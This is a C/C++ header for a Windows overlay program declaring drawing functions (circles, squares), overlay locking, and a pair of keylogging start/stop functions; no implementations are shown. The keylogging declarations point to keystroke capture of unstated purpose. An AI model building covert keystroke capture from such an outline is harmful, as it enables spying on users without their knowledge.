#pragma once

#include "framework.h"

// Window procedure callback
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);

// Overlay shape functions
void AddCircle(HWND hWnd);
void AddSquare(HWND hWnd);

// Overlay control functions
void LockOverlay(HWND hWnd);

// Keylogging functions
void StartKeylogging(HWND hWnd);
void StopKeylogging();

// Function to start drawing circles
void StartDrawingCircles(HWND hWnd);

// Function to stop drawing circles
void StopDrawingCircles(HWND hWnd);